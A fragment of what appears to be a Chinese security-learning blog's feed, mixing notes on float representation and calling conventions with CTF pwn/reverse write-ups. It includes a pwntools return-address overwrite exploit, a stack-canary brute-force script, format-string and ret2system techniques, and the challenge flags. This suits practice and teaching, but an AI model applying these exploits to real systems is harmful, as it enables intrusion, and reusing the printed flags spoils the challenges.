    </entry>
    
    
    
    <entry>
      <title>浮点数的表示</title>
      <link href="/2022/03/03/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E8%A1%A8%E7%A4%BA/"/>
      <url>/2022/03/03/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E8%A1%A8%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="浮点数的表示"><a href="#浮点数的表示" class="headerlink" title="浮点数的表示"></a>浮点数的表示</h1><p>c语言中的浮点数：float , double , long double</p><p><strong>首先，为什么要使用浮点方法，为什么要使用浮点数而不使用定长小数。</strong></p><p>这是因为如果小数定长，其精度就是固定的，也就是说，这样的表示方法就会有固定长度的整数位和小数位。一般这些位数都不会被全部用到，甚至很有可能牺牲精度，或者造成空间浪费，因此，需要创造一种小数点可以移动的数字表示方法，即浮点数。</p><p><strong>其次，如何科学的表示二进制数。</strong></p><p>这里引入二进制的科学计数法：<br>十进制有科学计数法，任何十进制数都可以表示为<code>x.xxxx*10^n</code>(x为0-9)，同理，所有二进制数也可以表示为<code>1.xxx*2^n</code>(x为0-1)，举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">101101.11101101转化为科学计数法</span><br><span class="line">1.0110111101101*2^5</span><br></pre></td></tr></table></figure><p>那么按照这样的思路，一个二进制数，就能表示为一个整数位定长为1，且一定是1的数字<code>1.0110111101101</code>(因为整数位永远是1，因此其实可以默认)，和另一个整数<code>5</code>，代表乘2的多少次方。</p><p><strong>然后，再加入正负的可能性，我们就可以完全的表示一个二进制数。</strong>**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N=((-1)^S)*(R^E)*M</span><br><span class="line">其中N是这个二进制数；</span><br><span class="line">S有两种取值，0表示N为正数，1表示N为负数；</span><br><span class="line">R恒为2；</span><br><span class="line">E是科学计数法中2的指数；</span><br><span class="line">M为科学计数法中以1.开头的二进制表示</span><br></pre></td></tr></table></figure><p><strong>最后，我们就可以开始设计浮点数了</strong></p><p>S有两种取值，只需要一位；</p><p>R取值固定，不需要表示，默认即可；</p><p>E是指数（上例中的5），为一个不定长的整数（可能正，可能负），需要多位；</p><p>M一定以1开头，因此可以忽略1，直接记录小数点后面的小数（即只记录0110111101101）；</p><p>我们看看官方的表示方法：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220303091320390.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220303091346438.png" alt="image-20220303091346438"></p><blockquote><p>IEEE<strong>754</strong>标准(规定了浮点数的表示格式,运算规则等)</p><p>​    规则规定了单精度(32)和双精度(64)的基本格式.<br>​    规则中,尾数（M）用原码,指数（E）用移码(便于对阶和比较)</p></blockquote><p>源码顾名思义就是二进制数直接写出来，不含符号位。</p><p>移码是什么呢？</p><p>上面说过，指数是有正负的可能性的，移码其实就是取中间数为0，减少为负数，增加为正数。</p><p>比如说：</p><p>对于32位的浮点数来说，E的位数有八位（256），因此选择127（01111111）为0，那么相应的，1就是128（10000000），-1就是126（01111110）。因此，如果给出一个值E，E-127就是指数的真实值。</p><p>同理，对于64位的浮点数来说，E的位数有11位，那么把E换算成十进制后，E-1023就是指数的真实值。</p><p>这样我们就学会如何表示一个浮点数了。</p><p>我们给出一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">20.59375转化为32位数浮点表示</span><br><span class="line">首先分别将整数和分数部分转换成二进制数：</span><br><span class="line">20.59375=10100.10011</span><br><span class="line">     然后移动小数点，使其在第1，2位之间</span><br><span class="line">10100.10011=1.010010011×2^4</span><br><span class="line">     e=4于是得到：</span><br><span class="line">S=0, E=4+127=131, M=010010011</span><br><span class="line">    因此最后得到32位浮点数的二进制存储格式为：</span><br><span class="line">01000001101001001100000000000000=(41A4C000)16</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_intOverflow_pwn</title>
      <link href="/2022/02/28/writeup_intOverflow_pwn/"/>
      <url>/2022/02/28/writeup_intOverflow_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-intOverflow-pwn"><a href="#writeup-intOverflow-pwn" class="headerlink" title="writeup_intOverflow_pwn"></a>writeup_intOverflow_pwn</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227161432735.png" alt="image-20220227161432735"></p><p>先小查一下，开启了堆栈不可执行，放ida吧</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228085215182.png" alt="image-20220228085215182"></p><p>逻辑很清楚，进login</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228085545413.png" alt="image-20220228085545413"></p><p>username：0x19<br>pw：0x199</p><p>好长的密码</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228085532326.png" alt="image-20220228085532326"></p><p>密码的长度为3-8则输出错误，否则正确。</p><p>那么首先要找溢出点，在<code>login</code>函数中，空间给的很大，而且<code>read()</code>函数限制严格，不可能溢出。</p><p>然后来到<code>check</code>函数中，一开始对密码的长度做了校验，然后把校验长度之后的密码通过strcpy放入dest中，这里dest的大小很小：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228111258226.png" alt="image-20220228111258226"></p><p>如果能跳过校验，我们就可以覆盖掉返回地址，然后调用<code>what_is_this</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228111405540.png" alt="image-20220228111405540"></p><p>那么如何绕过校验，让strcpy执行，复制足够长的字符串呢？这就需要整数溢出</p><blockquote><p>   Int8, 等于Byte, 占1个字节.</p></blockquote><p>可以看到int8非常的小，最大就是255， 如果存入int8的值比255还大，就会循环溢出。</p><p>因此</p><blockquote><p>password字符串的长度可以是3-8个字符，也可以是259-264个字符</p></blockquote><p>就靠这个原理就可以构造shellcode了，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote()</span><br><span class="line"></span><br><span class="line">cat_flag_addr=<span class="number">0x0804868B</span></span><br><span class="line"><span class="comment">#危险函数的地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your username:&quot;</span>, <span class="string">&quot;kk&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your passwd:&quot;</span>)</span><br><span class="line"><span class="comment">#如果密码长度为259（溢出后为4）</span></span><br><span class="line"><span class="comment">#0x18字节到溢出位</span></span><br><span class="line"><span class="comment">#溢出地址占四字节</span></span><br><span class="line"><span class="comment">#259-0x18-4=231</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>+ p32(cat_flag_addr)+<span class="string">b&quot;a&quot;</span>*<span class="number">231</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>跑一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220228114041108.png" alt="image-20220228114041108"></p><p>受不了python3了，马上就换2</p><p><strong>cyberpeace{988edb16506abc237bbd8c3996cf7728}</strong></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_guessNum_pwn</title>
      <link href="/2022/02/27/writeup_guessNum_pwn/"/>
      <url>/2022/02/27/writeup_guessNum_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-guessNum-pwn"><a href="#writeup-guessNum-pwn" class="headerlink" title="writeup_guessNum_pwn"></a>writeup_guessNum_pwn</h1><p>咱就是说，还得会c语言我是没想到的，枯了</p><p>先check一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227125713760.png" alt="image-20220227125713760"></p><p>好家伙，一片绿，哈人，没法覆盖返回地址了。</p><p>先扔ida：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227125511131.png" alt="image-20220227125511131"></p><p>循环产生随机数，然后猜数字，v7似乎可以做一个溢出</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227125816761.png" alt="image-20220227125816761"></p><p>然后就需要一点点c语言知识，在上面的区域中，seed变量的值是可以覆盖的，而seed是什么呢？</p><p><em>在使用rand()函数时，首先需要使用srand设定一个seed，只有随机生成了seed每一次rand()顺序生成的数列才是不同的，若seed相同时，生成的随机数列也是相同的。</em></p><p>我不信，小试一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227154839418.png" alt="image-20220227154839418"></p><p>我信了。。。</p><p>按照逆向的思路，我们可以看看随机的seed是如何生成的，进入sub_BB0函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227155010434.png" alt="image-20220227155010434"></p><p>果然不是逆向，是在本地文件中读取的，那没事了。</p><p>所以只要覆盖seed，并且用seed在本地生成随机数，然后再传过去就可以了，创作一个脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220227155955030.png" alt="image-20220227155955030"></p><p>顺便学一下python中调用c语言。</p><p><strong>cyberpeace{5df2a9bab4fa085d9359d4c9722f857c}</strong></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Canery(金丝雀)的介绍与绕过</title>
      <link href="/2022/02/27/Canery(%E9%87%91%E4%B8%9D%E9%9B%80)%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
      <url>/2022/02/27/Canery(%E9%87%91%E4%B8%9D%E9%9B%80)%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="Canery-金丝雀-的介绍与绕过"><a href="#Canery-金丝雀-的介绍与绕过" class="headerlink" title="Canery(金丝雀)的介绍与绕过"></a>Canery(金丝雀)的介绍与绕过</h1><p>摘抄文献 ：<a href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p><blockquote><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p></blockquote><p>当我们使用栈溢出进行攻击，或者覆盖返回地址时，会覆盖掉源数据。金丝雀机制就是在栈底插入cookie验证信息，如果cookie被覆盖就会验证失败。</p><p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段。</p><h2 id="Canary的使用（gcc）"><a href="#Canary的使用（gcc）" class="headerlink" title="Canary的使用（gcc）"></a>Canary的使用（gcc）</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><p><code>-fstack-protector </code>启用保护，不过只为局部变量中含有数组的函数插入保护<br><code>-fstack-protector-all </code>启用保护，为所有函数插入保护<br><code>-fstack-protector-strong</code><br><code>-fstack-protector-explicit </code>只对有明确 stack_protect attribute 的函数开启保护<br><code>-fno-stack-protector</code> 禁用保护</p><h2 id="canary的实现原理："><a href="#canary的实现原理：" class="headerlink" title="canary的实现原理："></a>canary的实现原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><h2 id="Canary的绕过"><a href="#Canary的绕过" class="headerlink" title="Canary的绕过"></a>Canary的绕过</h2><p>给出常见的存在 Canary 的栈溢出利用思路，每种方法都有特定的环境要求。</p><h3 id="一、泄露栈中的Canary"><a href="#一、泄露栈中的Canary" class="headerlink" title="一、泄露栈中的Canary"></a>一、泄露栈中的Canary</h3><p>通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中.</p><h3 id="二、爆破Canary"><a href="#二、爆破Canary" class="headerlink" title="二、爆破Canary"></a>二、爆破Canary</h3><p>虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的。</p><p>附爆破python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Brute forcing stack canary &quot;</span></span><br><span class="line"></span><br><span class="line">start = <span class="built_in">len</span>(p)</span><br><span class="line">stop = <span class="built_in">len</span>(p)+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">      res = send2server(p + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> res != <span class="string">&quot;&quot;</span>:</span><br><span class="line">         p = p + <span class="built_in">chr</span>(i)</span><br><span class="line">         <span class="comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[-] Exploit failed&quot;</span></span><br><span class="line">         sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-<span class="number">1</span>:-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary</span><br></pre></td></tr></table></figure><h3 id="三、劫持-stack-chk-fail-函数"><a href="#三、劫持-stack-chk-fail-函数" class="headerlink" title="三、劫持__stack_chk_fail 函数"></a>三、劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 __stack_chk_failed 函数，__stack_chk_failed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 __stack_chk_fail 的 GOT 表，再进行 ROP 利用</p><h3 id="四、覆盖-TLS-中储存的-Canary-值"><a href="#四、覆盖-TLS-中储存的-Canary-值" class="headerlink" title="四、覆盖 TLS 中储存的 Canary 值"></a>四、覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup-CGfsb-pwn</title>
      <link href="/2022/02/26/writeup_CGfsb_pwn/"/>
      <url>/2022/02/26/writeup_CGfsb_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-CGfsb-pwn"><a href="#writeup-CGfsb-pwn" class="headerlink" title="writeup-CGfsb-pwn"></a>writeup-CGfsb-pwn</h1><p>麻了，pwn好难哈哈哈哈哈哈</p><p>本题目是利用字符串格式化漏洞来更改<code>pwnme</code>变量的值。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226170521013.png" alt="image-20220226170521013"></p><p>先看看pwnme变量存在哪了？</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226170644707.png" alt="image-20220226170644707"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226170741811.png" alt="image-20220226170741811"></p><p>简单地说，就是一个会自动初始化为0的可读写区段。</p><p>那么，到底什么是字符串格式化漏洞？</p><p><code>printf</code>函数含有的参数构造是由一个固定的<strong>format</strong>字符串和<strong>多个输出表列</strong>组成的，他们在函数调用时被一起推入内存，当我们在format字符串中形如填了<code>%啥</code>的东西后，他就会自动在内存中寻找参数（也就是我们推入的输出表项）；</p><p>在printf函数中，有一个带有赋值功能的格式化字符串是<code>%n</code>，其功能就是记录在<code>%n</code>之前输出的字符数，然后将此值赋给一个变量。那赋值给哪一个变量呢？我们就需要传入这个变量的指针，也就是使用<code>&amp;变量名</code>来接收参数，即类似于下图中的语法：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226173819436.png" alt="image-20220226173819436"></p><p>这样一来，我们就可以利用printf进行赋值了。</p><p>那么，我们要赋值给pwnme这个变量，要怎么做呢。</p><p>我们只能传入一个参数，因此需要手动设定在format字符串中%n这个赋值操作的偏移量，他并不是直接指向下一个地址，而是指向了某一个存了目标（即pwnme）变量的指针的地址，那么这个指针肯定也是由我们通过前面的输入（就是format字符串中有一个地址，我们用控制%n的偏移，让他赋值的时候赋给format中含有的那个地址）传入的内容啦。</p><p>那么，控制偏移要怎么做？</p><blockquote><p>%n：将%n 之前 printf 已经打印的字符个数赋值给<strong>偏移处指针所指向的地址 位置，如%100×10$n 表示将 0x64 写入偏移 10 处保存的指针所指向的地址（4 字节）</strong>，而%$hn 表示写入的地址空间为 2 字节，%$hhn 表示写入的地址空间为 1 字节，%$lln 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时， 直接写 4 字节会导致程序崩溃或等候时间过长，可以通过%$hn 或%$hhn 来适时 调整。</p></blockquote><p>就是这样，我们模仿这样的语法去调用就可以。。。</p><p>然后呢，我们现在需要知道的就是，我们通过scanf输入的那个地址存在哪里，我们用printf去往那个地址上赋值就可以了。</p><p>那么，我们需要知道printf函数的调用地址相较scanf输入的偏移量，可以有两种方法：</p><p><strong>其一，用格式化字符串进行输出测试</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226220040384.png" alt="image-20220226220040384"></p><p>可以看到，在红圈处圈起来的就是<em>aaaa</em>的十六进制码，除了<em>aaaa</em>以外，在第十的位置。</p><p><strong>其二，用gdb进行调试</strong></p><p>真难用，换edb吧还是。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226222728483.png" alt="image-20220226222728483"></p><p>差十个地址。</p><p>然后我们知道了偏移值后，就可以构造脚本了</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220226223030843.png" alt="image-20220226223030843"></p><p>不能说不费劲，只能说是非常费劲。。。</p><p><strong>cyberpeace{79366eb910334f932677401355a7f418}</strong></p>]]></content>
      
      
      <categories>
          
          <category> pwns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编函数调用的传参规则</title>
      <link href="/2022/02/26/%E6%B1%87%E7%BC%96_%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99/"/>
      <url>/2022/02/26/%E6%B1%87%E7%BC%96_%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E4%BC%A0%E5%8F%82%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编函数调用的传参规则"><a href="#汇编函数调用的传参规则" class="headerlink" title="汇编函数调用的传参规则"></a>汇编函数调用的传参规则</h1><p>函数调用一般有个模板。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">push es</span><br><span class="line">mov ebp,esp</span><br><span class="line">//这里提升堆栈</span><br><span class="line">sub esp,0x40  </span><br><span class="line">//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。</span><br><span class="line">push edi</span><br><span class="line">push esi</span><br><span class="line">push ebx</span><br><span class="line">//保留现场</span><br><span class="line">lea edi, dword ptr ss:[ebp-0x40]</span><br><span class="line">mov ecx,0x10</span><br><span class="line">mov eax,0xcccccccc</span><br><span class="line">rep stos dowrd ptr es:[edi]</span><br><span class="line">//填充缓冲区</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">//这里是写函数的功能</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">pop ebx</span><br><span class="line">pop esi</span><br><span class="line">pop edi</span><br><span class="line">//恢复现场</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>中间的ccc…就是填充缓冲区。填充后可以用来写入局部变量。<br>EBP后面的高址，存有恢复用的EIP，和call函数前push的参数。<br>EBP前面的低址，用来存局部变量。</p><p>根据函数调用约定的不同，堆栈平衡的方式不同<br>如果是__cedcl约定，是在母函数中平衡堆栈，就是函数调用完返回后，在调用者里add esp，xx来平衡堆栈。</p><p>有几种函数调用约定，不同的调用约定，参数的传递，堆栈的平衡方式不同。下面是三种常见的调用约定：</p><h2 id="cedcl-约定："><a href="#cedcl-约定：" class="headerlink" title="__cedcl 约定："></a>__cedcl 约定：</h2><p>参数从右往左，依次入栈。堆栈平衡在母函数中完成。<br>在函数调用前，将参数压栈。<br>push xxx<br>push xxx<br>…<br>然后call 函数。<br>//函数执行完毕<br>add esp ，xx<br>//在母函数中平衡堆栈</p><h2 id="stdcall-约定："><a href="#stdcall-约定：" class="headerlink" title="stdcall 约定："></a>stdcall 约定：</h2><p>参数从右往左依次入栈，在子函数中 平衡堆栈。<br>参数还是在调用前push 入栈。<br>平衡堆栈时，在 ret 后加个 xx 恢复堆栈<br>例如 ret 0x8，相当于 pop eip add esp，0x8</p><h2 id="fastcall-约定："><a href="#fastcall-约定：" class="headerlink" title="fastcall 约定："></a>fastcall 约定：</h2><p>参数从右往左依次入栈，在子函数中 平衡堆栈<br>参数1个或者两个用 寄存器 传参，多于两个，多余两个的部分还是压栈传参。<br>例如 (int a,int b,int c)<br>push c<br>mov eax,b<br>mov ecx,a<br>然后再call 函数，最后在子函数中平衡堆栈。</p><p>————————————————<br>版权声明：本文为CSDN博主「dittozzz」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_43394612/article/details/84332149">https://blog.csdn.net/qq_43394612/article/details/84332149</a></p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_babyXOR_reverse</title>
      <link href="/2022/02/25/writeup_babyXOR_reverse/"/>
      <url>/2022/02/25/writeup_babyXOR_reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-babyXOR-reverse"><a href="#writeup-babyXOR-reverse" class="headerlink" title="writeup_babyXOR_reverse"></a>writeup_babyXOR_reverse</h1><p>有不知名壳，esp定律手动脱</p><p>放进ida，好家伙，七百个函数，离大谱</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195451797.png" alt="image-20220225195451797"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195553195.png" alt="image-20220225195553195"></p><p>先看看main函数里有啥，发现花里胡哨，查教程，麻烦的离谱，果断动调看看。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195818909.png" alt="image-20220225195818909"></p><p>上为输入函数，随便输入了一串字符</p><p>运行到此处发现：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195903238.png" alt="image-20220225195903238"></p><p>阿哲？</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195928601.png" alt="image-20220225195928601"></p><p>行8</p><p><strong>flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</strong></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_level2_pwn</title>
      <link href="/2022/02/24/writeup_level2_pwn/"/>
      <url>/2022/02/24/writeup_level2_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-level2-pwn"><a href="#writeup-level2-pwn" class="headerlink" title="writeup_level2_pwn"></a>writeup_level2_pwn</h1><p>属于是level0的升级版，没啥可查的，直接ida：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224164752204.png" alt="image-20220224164752204"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224164800080.png" alt="image-20220224164800080"></p><p>可以看到，依然是有缓冲区溢出漏洞的一个函数，buf数组的大小转换成十六进制也就0x88，却能读入0x100的数据。</p><p>依然是通过溢出，对函数的返回地址进行覆盖：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224165046553.png" alt="image-20220224165046553"></p><p>进入调用函数system，然而system函数需要一个参数的地址（即/bin/sh)字符串的地址，我们没有该字符串，无法虚空调用，只能在程序的字符串列表中进行寻找：<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224165329105.png" alt="image-20220224165329105"></p><p>view-subview-string可以看到系统贴心的准备了：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224165416046.png" alt="image-20220224165416046"></p><p>现在我们就可以在调用<code>_system</code>函数时，通过缓冲区的覆盖把字符串的地址也提前覆盖进去：</p><p>创作一下脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224171047696.png" alt="image-20220224171047696"></p><p>行！</p><p>cyberpeace{40fb2960396105316b3733bd0c6cf1fd}</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_level0_pwn</title>
      <link href="/2022/02/24/writeup_level0_pwn/"/>
      <url>/2022/02/24/writeup_level0_pwn/</url>
      
